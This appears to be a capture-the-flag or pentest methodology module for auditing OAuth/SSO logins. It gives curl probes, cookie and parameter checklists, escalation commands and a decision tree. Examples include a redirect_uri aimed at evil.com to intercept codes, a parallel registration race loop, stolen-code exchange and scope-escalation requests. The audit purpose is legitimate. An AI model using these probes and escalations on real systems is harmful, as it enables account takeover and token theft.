# Field manual deep — the OAuth audit at a glance, with the full mechanics

The field-manual module names the steps. This module carries the full
mechanics — every command, every expected output, every decision point.

## Step 0 — the transcript (the exploit surface)

```bash
JAR=/tmp/oauth-jar.txt
curl -i -b "$JAR" -c "$JAR" -L "$BASE/login" 2>&1 | tee transcript.txt
```

Extract the artifacts:

```bash
# the authorize URL — every parameter is a testable surface
grep -oP 'authorize\?[^"]+' transcript.txt | tr '&' '\n'

# the callback URL — code, state, error
grep -oP 'callback\?[^"]+' transcript.txt | tr '&' '\n'

# the Set-Cookie headers — the cookie inventory
grep -i "Set-Cookie" transcript.txt
```

## Step 1 — the cookie inventory

For each `Set-Cookie`, record:

| Attribute | The check | The gap |
|---|---|---|
| `SameSite` | `Lax`/`Strict`/`None`/missing | missing or `None` → cross-site writes land |
| `HttpOnly` | present/missing | missing → readable by JS |
| `Secure` | present/missing | missing → over plain HTTP |
| `Domain` | app domain/parent domain | parent → shared across subdomains |
| `Path` | `/` or restricted | `/` → readable everywhere |

Two cookies — one from the app (`session`), one from the IdP (`token`/`sso`/`auth`)
— in the same jar is the swap signal.

## Step 2 — the parameter inventory

Every parameter in the `authorize` URL is a testable surface:

| Parameter | The surface | The check |
|---|---|---|
| `client_id` | the registered client | enumerate — sequential? predictable? |
| `redirect_uri` | the code delivery target | exact match? prefix? wildcard? |
| `response_type` | the flow shape | `code` only? `token`? `id_token`? hybrid? |
| `scope` | the permissions | broader than requested? `offline_access`? |
| `state` | the CSRF binding | bound to session? single-use? predictable? |
| `nonce` | the replay binding | present? validated? |
| `code_challenge` | the PKCE binding | required? `S256` or `plain`? |
| `code_challenge_method` | the PKCE method | `S256` enforced? `plain` accepted? |
| `prompt` | the consent behavior | `none` → silent re-auth? |
| `max_age` | the re-auth window | required? enforced? |
| `login_hint` | the prefilled username | reflected? injectable? |
| `id_token_hint` | a previous `id_token` | replayable? |
| `request`/`request_uri` | a JWT carrying the request | signature verified? URI SSRF-able? |
| `response_mode` | the delivery mode | `query`? `fragment`? `form_post`? `web_message`? |
| `claims` | the requested claims | broader? |
| `aud` | the token audience | present? validated? |
| `resource` | the resource indicator | a different resource? |
| `acr_values` | the auth level | lower acr accepted? |

## Step 3 — the falsifier sweep (cheapest first)

```bash
# falsifier 1 — state binding
STATE=$(curl -si -b "$JAR" -c "$JAR" "$BASE/login" | grep -oP 'state=\K[^&\s]+')
curl -i -b "$JAR" "$BASE/callback?code=ABC&state=DIFFERENT"
# 400 state mismatch → falsifier; 302 session → confirmation

# falsifier 2 — redirect_uri validation
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://evil.com/callback&response_type=code&state=XYZ"
# 400 invalid redirect_uri → falsifier; 302 delivering code → confirmation

# falsifier 3 — SameSite on the SSO token
grep -i "Set-Cookie.*token\|Set-Cookie.*sso\|Set-Cookie.*auth" transcript.txt
# SameSite=Lax|Strict → falsifier; missing or None → live

# falsifier 4 — response_type allowlist
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=token&state=XYZ&nonce=N"
# 302 to fragment → live; 400 → falsifier

# falsifier 5 — PKCE required
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ"
# accepted → live; 400 → falsifier
```

## Step 4 — the confirmation

When a falsifier does not hold, the shape is live. Confirm it with the
verbatim response that carries the artifact:

```bash
# the confirmation command
python3 tools/hooks.py post-probe "$CHALLENGE" --class web-oauth-sso \
  --hypothesis-id "$HID" --verdict confirms \
  --evidence-kind class \
  --evidence "$(grep -E 'HTTP/|Set-Cookie:|Location:' evidence.txt | head -3)" \
  --response "$(cat evidence.txt)"
```

## Step 5 — the escalation

| Confirmed shape | The escalation | The command |
|---|---|---|
| state not bound | login-CSRF or linking-CSRF | the victim visits the attacker's authorize URL |
| redirect_uri loose | code-interception | the code is delivered to the attacker's endpoint |
| account linking on email | pre-registration race | `for i in $(seq 1 50); do curl -X POST $BASE/api/register ... & done` |
| cookie swap | text/plain JSON login | `curl -X POST $IDP/api/login -H "Content-Type: text/plain" -d '{...}'` |
| implicit leak | fragment-harvest | `curl "https://idp/authorize?...&response_type=token"` |
| PKCE bypass | stolen-code exchange | `curl -X POST $IDP/token -d "grant_type=authorization_code&code=STOLEN&..."` |
| cross-client | code replay | `curl -X POST $IDP/token -d "...&client_id=B&..."` |
| scope escalation | broader token | `curl "https://idp/authorize?...&scope=openid+admin"` |
| registration race | pre-registration | `curl -X POST $BASE/api/register -d '{"email":"student@domain",...}'` |

## Step 6 — the negative ledger

```bash
python3 tools/hooks.py post-probe "$CHALLENGE" --class web-oauth-sso \
  --hypothesis-id "$HID" --verdict negative \
  --request "<probe>" --result "<verbatim result>"
```

## Step 7 — the kill map

```bash
python3 tools/hooks.py post-probe "$CHALLENGE" --class web-oauth-sso \
  --hypothesis-id "$HID" --verdict falsifier \
  --request "<probe>" --result "<verbatim falsifier>"
```

## The decision tree

```
Is there a second cookie (IdP token) in the jar?
  YES → check SameSite → missing/None → cookie-swap shape live
  NO  → single-cookie model → move to state/redirect_uri

Is state bound to session?
  NO  → state CSRF live → login-CSRF or linking-CSRF
  YES → falsifier → move to redirect_uri

Is redirect_uri strictly validated?
  NO  → code-interception live
  YES → falsifier → move to account linking

Is linking on email/username?
  YES → pre-registration race live
  NO  → falsifier → move to implicit/PKCE/cross-client

Is response_type allowlisted to code?
  NO  → implicit-leak live → fragment-harvest
  YES → falsifier → move to PKCE

Is PKCE required + S256 + verifier re-validated?
  NO  → PKCE-bypass live → stolen-code exchange
  YES → falsifier → move to cross-client

Is code bound to client_id + aud verified?
  NO  → cross-client live → code replay
  YES → falsifier → reclassify
```
